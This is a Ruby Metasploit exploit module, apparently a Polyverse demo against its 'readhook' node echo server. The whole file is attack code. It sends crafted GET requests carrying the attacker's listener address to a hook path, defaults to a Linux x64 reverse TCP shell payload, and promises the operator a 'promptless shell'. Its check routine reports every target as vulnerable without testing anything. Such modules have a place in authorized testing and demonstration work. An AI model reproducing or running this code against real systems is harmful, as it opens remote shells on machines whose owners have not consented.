class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::HttpClient

    module Target
	Linux = 0 # Generic Linux
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'        => 'Polyverse readhook-node-echo-server example',
                'Description' => %q{
			Do a send_request_cgi()
		},
                'Author'      => [ 'Polyverse Corp.' ],
		'License'     => MSF_LICENSE,
                'References'  => [
                    [ 'URL', 'https://polyverse.io' ],
                ],
                'Platform'    => [ 'linux' ],
                'Payload'     => { },
                'Arch'        => [ ARCH_X64 ],
                'Targets'     => [
                    [
                        'Linux x64',
                        {
                            'Arch' => ARCH_X64,
                        }
                    ]
                ],
                'DefaultTarget'  => Target::Linux,
                'DefaultOptions' => {
                    'PAYLOAD' => 'linux/x64/shell_reverse_tcp'
                }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
	    OptString.new('FULLHOOK_BASE_URI', [true, 'The base path for FULLHOOK magic.', '/xyzzx']),
	    OptString.new('BASEHOOK_BASE_URI', [true, 'The base path for BASEHOOK magic.', '/xyzzy'])
	], self.class)
    end

    # Returns that the remote host is always vulnerable
    def check
        return Exploit::CheckCode::Vulnerable
    end

    def exploit
        print_status("Start...")

        if check() != Exploit::CheckCode::Vulnerable
            print_error("check() failed")
            return
        end

        # Exploit
	uri = datastore['FULLHOOK_BASE_URI'] + "MAKELOAD" + datastore['LHOST'] + ':' + datastore['LPORT'].to_s(10)
	res = send_request_cgi( { 'method' => 'GET', 'uri' => uri } )

        if res && res.code == 200
	    res = send_request_cgi( { 'method' => 'GET', 'uri' => res.body } )
        end

        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
